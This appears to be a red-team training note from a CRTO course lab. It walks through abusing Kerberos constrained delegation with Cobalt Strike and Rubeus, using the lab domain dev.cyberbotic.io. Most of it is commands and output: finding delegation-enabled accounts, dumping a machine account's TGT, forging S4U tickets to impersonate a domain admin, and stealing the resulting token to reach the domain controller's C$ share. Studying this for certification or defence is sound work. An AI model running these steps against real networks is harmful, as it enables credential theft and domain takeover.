[[Delegation]]

Created as a safer way to do delegation than [[Unconstrained Delegation]], it aims to restrict the services to which the server can act on behalf of a user.

It no longer allows the server to cache the TGTs of other users, but allows it to request a TGS for another user with its own TGT.

  Constrained delegation can be configured on user accounts as well as computer accounts.  We can search for both.

## 🖊️ via Cobalt Strike

1) To find computers or users (modify the object category accordingly) configured for constrained delegation, search for those whose  `msds-allowedtodelegateto` attribute is not empty. 

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "dnshostname": "sql-2.dev.cyberbotic.io",
    "samaccountname": "SQL-2$",
    "msds-allowedtodelegateto": [
      "cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "cifs/dc-2.dev.cyberbotic.io",
      "cifs/DC-2",
      "cifs/dc-2.dev.cyberbotic.io/DEV",
      "cifs/DC-2/DEV"
    ]
  }
]
```

in this example we can see the sql box (current beacon session), is delegate to the dc2
==Also notice the account that allows the delegation (sql-2$)

2) To perform the delegation, we need the TGT of the principal (computer or user) trusted for delegation.  The most direct way is to extract it with Rubeus `dump`:

```
beacon> run hostname
sql-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 --------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                    | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
| 0x3e4    | sql-2$ @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 9/6/2022 7:06:50 PM |

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
    ServiceRealm             :  DEV.CYBERBOTIC.IO
    UserName                 :  SQL-2$
    UserRealm                :  DEV.CYBERBOTIC.IO
    StartTime                :  9/6/2022 9:06:50 AM
    EndTime                  :  9/6/2022 7:06:50 PM
    RenewTill                :  9/13/2022 9:06:50 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  pj1tbiijFCGHkM6S58ShgxxPi8FvA1UB5liBqrSWPCg=
    Base64EncodedTicket   :

doIFpD[...]MuSU8=
```

  You can also request one with Rubeus `asktgt` if you have NTLM or AES hashes.

3) With the TGT, perform an S4U ([[S4U2Self Abuse]]) request to obtain a usable TGS for CIFS on DC-2 (in this example).

Remember that we can impersonate any user in the domain, but we want someone who we know to be a local admin on the target.  In this case, a domain admin makes the most sense.

This will perform an S4U2Self first and then an S4U2Proxy.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap`

where:

- `/impersonateuser` is the user we want to impersonate.
- `/msdsspn` is the service principal name that SQL-2 is allowed to delegate to.
- `/user` is the principal allowed to perform the delegation., we saw at the begining
- `/ticket` is the TGT for `/user`.

4) Grab the final S4U2Proxy ticket and pass it into a new logon session.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv`

That will create a new local process with the integrity of the ticket ([[Pass the Ticket]]), then [[Steal the token]]:

`beacon> steal_token [pid]`

5) Check your access into the victim machine:

`beacon> ls \\dc-2.dev.cyberbotic.io\c$`
Use FQDN

You could perform other actions with this new TGS, check [[Alternate Service Name]] method.

### ⚠ Opsec




### Properties
---
📆 created   {{19-02-2024}} 08:51
🏷️ tags: #redteam #crto 

---

